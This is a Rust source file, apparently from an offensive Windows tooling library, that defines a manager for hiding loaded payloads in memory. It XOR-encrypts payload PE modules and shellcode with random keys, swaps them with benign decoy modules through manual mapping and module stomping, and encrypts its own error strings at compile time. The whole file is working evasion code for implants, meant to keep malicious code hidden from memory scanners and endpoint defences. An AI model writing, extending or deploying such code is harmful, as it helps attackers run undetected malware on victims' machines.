#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{collections::HashMap, cell::UnsafeCell};
use windows::Win32::Foundation::HANDLE;
use data::{PeMetadata, PVOID, PAGE_READWRITE};
use nanorand::{Rng, BufferedRng, WyRand};

pub struct Manager
{
    payloads: HashMap<isize, Vec<u8>>,
    payloads_metadata: HashMap<isize, PeMetadata>,
    decoys_metadata: HashMap<isize, PeMetadata>,
    decoys: HashMap<isize, Vec<u8>>,
    counter: HashMap<isize, i64>,
    keys: HashMap<isize, u8>
}

impl Manager {
    pub fn new () -> Manager {
        Manager{
            payloads: HashMap::new(),
            payloads_metadata: HashMap::new(),
            decoys_metadata: HashMap::new(),
            decoys: HashMap::new(),
            counter: HashMap::new(),
            keys: HashMap::new(),
        }
    }

    pub fn new_module (&mut self, address: isize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
    {   
        if self.payloads.contains_key(&address)
        {
            return Err(lc!("[x] This address is already mapped."));
        }

        unsafe 
        {
            let payload_metadata = manualmap::get_pe_metadata(payload.as_ptr())?;
            let decoy_metadata = manualmap::get_pe_metadata(decoy.as_ptr())?;

            let mut rand_bytes = [0u8; 15];
            let mut rng = BufferedRng::new(WyRand::new());
            rng.fill(&mut rand_bytes);
            let mut key_ptr = rand_bytes.as_ptr();

            let mut xor_key: u8 = *key_ptr;
            key_ptr = key_ptr.add(1);
            while *key_ptr != '\0' as u8
            {
                xor_key = xor_key ^ *key_ptr;
                key_ptr = key_ptr.add(1);
            }

            let xored_payload = Manager::xor_module(payload, xor_key);
            let xored_decoy = Manager::xor_module(decoy, xor_key);

            self.payloads.insert(address, xored_payload);
            self.payloads_metadata.insert(address, payload_metadata);
            self.decoys_metadata.insert(address, decoy_metadata);
            self.decoys.insert(address, xored_decoy);
            self.counter.insert(address, 1);
            self.keys.insert(address, xor_key);

            Manager::hide_module(self, address)?;

        }

        Ok(())
    }

    pub fn new_shellcode (&mut self, address: isize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
    {   
        if self.payloads.contains_key(&address)
        {
            return Err(lc!("[x] This shellcode is already mapped."));
        }

        unsafe 
        {
            let mut rand_bytes = [0u8; 15];
            let mut rng = BufferedRng::new(WyRand::new());
            rng.fill(&mut rand_bytes);
            let mut key_ptr = rand_bytes.as_ptr();

            let mut xor_key: u8 = *key_ptr;
            key_ptr = key_ptr.add(1);
            while *key_ptr != '\0' as u8
            {
                xor_key = xor_key ^ *key_ptr;
                key_ptr = key_ptr.add(1);
            }

            let xored_payload = Manager::xor_module(payload, xor_key);
            let xored_decoy = Manager::xor_module(decoy, xor_key);

            self.payloads.insert(address, xored_payload);
            self.decoys.insert(address, xored_decoy);
            self.counter.insert(address, 1);
            self.keys.insert(address, xor_key);

            Manager::hide_shellcode(self, address)?;

        }

        Ok(())
    }

    fn xor_module (module: Vec<u8>, key: u8) -> Vec<u8>
    {
        unsafe
        {
            let mut module_ptr = module.as_ptr();
            let mut final_module: Vec<u8> = vec![];

            for _i in 0..module.len()
            {
                final_module.push(*module_ptr ^ key);
                module_ptr = module_ptr.add(1);
            }

            final_module
        }
    }

    pub fn map_module (&mut self, address: isize) -> Result<(),String>
    {
        unsafe
        {
            if self.payloads.contains_key(&address)
            {
                if self.counter.get(&address).unwrap() == &0
                {   
                    let payload = self.payloads.get(&address).unwrap();
                    let key = *self.keys.get(&address).unwrap();
                    let pe_info = self.payloads_metadata.get(&address).unwrap();
                    let decoy_info = self.decoys_metadata.get(&address).unwrap();
                    
                    let addr: PVOID = std::mem::transmute(address);
                    let handle = HANDLE {0: -1};
                    let base_address: *mut PVOID = std::mem::transmute(&address);
                    let s: UnsafeCell<i64> = i64::default().into();
                    let size: *mut usize = std::mem::transmute(s.get());
                    
                    if decoy_info.is_32_bit
                    {
                        *size = decoy_info.opt_header_32.SizeOfImage as usize;
                    }
                    else 
                    {
                        *size = decoy_info.opt_header_64.size_of_image as usize;
                    }


                    let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                    let ret = dinvoke::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
                    

                    if ret != 0
                    {
                        return Err(lc!("[x] Error changing memory protection."));
                    }

                    dinvoke::rtl_zero_memory(*base_address, *size);
                    let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                    let _r = manualmap::map_to_allocated_memory(decrypted_payload.as_ptr(), addr, pe_info)?;
                    let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
                    
                    for i in 0..decrypted_payload.len()
                    {
                        *(decrypted_payload_ptr.add(i)) = 0u8;
                    }
                } 

                self.counter.insert(address, self.counter[&address] + 1);

            }

            Ok(())
        }
    }

    pub fn hide_module(&mut self, address: isize) -> Result<(),String>
    {
        unsafe
        {
            if self.payloads.contains_key(&address)
            {
                if self.counter.get(&address).unwrap() == &1
                {   
                    let decoy = self.decoys.get(&address).unwrap();
                    let key = *self.keys.get(&address).unwrap();
                    let decrypted_decoy = Manager::xor_module(decoy.to_vec(), key);
                    let pe_info = self.decoys_metadata.get(&address).unwrap();
                    let addr: PVOID = std::mem::transmute(address);
    
                    let handle = HANDLE {0: -1};
                    let base_address: *mut PVOID = std::mem::transmute(&address);
                    let s: UnsafeCell<usize> = usize::default().into();
                    let size: *mut usize = std::mem::transmute(s.get());
                    
                    if pe_info.is_32_bit
                    {
                        *size = pe_info.opt_header_32.SizeOfImage as usize;
                    }
                    else 
                    {
                        *size = pe_info.opt_header_64.size_of_image as usize;
                    }


                    let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                    let ret = dinvoke::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
                    dinvoke::rtl_zero_memory(*base_address, *size);

                    if ret != 0
                    {
                        return Err(lc!("[x] Error changing memory protection."));
                    }

                    let _r = manualmap::map_to_allocated_memory(decrypted_decoy.as_ptr(), addr, pe_info)?;
                } 


                if self.counter.get(&address).unwrap() >= &1
                {
                    self.counter.insert(address, self.counter[&address] - 1);
                }

            }

            Ok(())
        }
    }

    pub fn hide_shellcode(&mut self, address: isize) -> Result<(),String>
    {
        if self.payloads.contains_key(&address)
        {
            if self.counter.get(&address).unwrap() == &1
            {   
                let decoy = self.decoys.get(&address).unwrap();
                let key = *self.keys.get(&address).unwrap();
                let decrypted_decoy = Manager::xor_module(decoy.to_vec(), key);    
                let result = overload::managed_module_stomping(&decrypted_decoy, address, 0);

                if !result.is_ok()
                {
                    return Err(lc!("[x] Error hiding shellcode."));
                }
            } 

            if self.counter.get(&address).unwrap() >= &1
            {
                self.counter.insert(address, self.counter[&address] - 1);
            }

        }

        Ok(())
        
    }

    pub fn stomp_shellcode(&mut self, address: isize) -> Result<(),String>
    {
        if self.payloads.contains_key(&address)
        {
            if self.counter.get(&address).unwrap() == &0
            {   
                let payload = self.payloads.get(&address).unwrap();
                let key = *self.keys.get(&address).unwrap();
                let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                let result = overload::managed_module_stomping(&decrypted_payload, address, 0);
                let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
                unsafe
                {
                    for i in 0..decrypted_payload.len()
                    {
                        *(decrypted_payload_ptr.add(i)) = 0u8;
                    }
                }

                if !result.is_ok()
                {
                    return Err(lc!("[x] Error stomping shellcode."));
                }

            } 

            self.counter.insert(address, self.counter[&address] + 1);

        }

        Ok(())
        
    }

}